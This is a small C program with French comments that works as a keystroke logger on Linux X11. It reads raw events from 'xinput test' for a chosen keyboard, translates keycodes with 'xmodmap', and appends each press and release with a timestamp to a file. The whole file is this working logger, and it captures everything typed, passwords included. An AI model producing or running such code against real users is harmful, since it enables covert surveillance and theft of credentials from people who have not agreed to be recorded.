#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>




int get_keymap(char keymap[][40]);

int main(int argc, char *argv[]){

	if (argc < 3 ){
		printf("Usage : %s id_du_clavier fichier_d_enregistrement\n",argv[0]);
		return 0;
	}

	time_t curtime;

	/* lancement commande xinput*/
	int id = atoi(argv[1]);
	char commande[20];
	printf("l'id du clavier est %d\n", id);
	sprintf(commande,"xinput test %d",id);
	FILE *sortie;
	if((sortie = popen(commande,"r"))==NULL){ perror("impossible de lancer la commande xinput"); return 0;}


	/*ouverture fichier enregistrement*/
	printf("l'adresse du fichier de sauvegarde est %s\n",argv[2]);
	FILE *enregistrement;
	if((enregistrement = fopen(argv[2],"a"))==NULL) { perror("impossible d'ouvrir le fichier d'enregistrement"); return 0;}
	

	/*buffers*/
	char sortie_xinput[40];
	int num;


		/* recuperation du keymap du clavier*/
	char keymap[256][40];
	if(get_keymap(keymap)==-1){
		perror("Erreur dans la lecture du keymap");
		return (-1);
	}


	
	while (fgets(sortie_xinput,40,sortie) != NULL) {
			time(&curtime);
		if(sscanf(sortie_xinput,"key press %d", &num)==1){
			fprintf(enregistrement,"press %s %s\n",keymap[num],ctime(&curtime));
		}
		else if (sscanf(sortie_xinput,"key release %d", &num)==1){
			fprintf(enregistrement,"release %s %s\n", keymap[num],ctime(&curtime));
			}
		fflush(enregistrement);
	}
	fclose(enregistrement);
	pclose(sortie);
	return 0;
}

int get_keymap(char keymap[][40]){/* keymap[i]="string"*/
	FILE *map;
	map=popen("xmodmap -pke","r");
	int num;
	char attente[40];
	char attent[40];

	if(map==NULL){
		perror("Can't launch the command");
		return (-1);
	}
	
	while (fgets(attente,40,map)!=NULL) {
		if (sscanf(attente,"keycode %d = %s",&num,attent)>=1 && num<256 && num>0){
			memcpy(*(keymap+num),attent,40);
		}
	}
	pclose(map);
	return 0;
}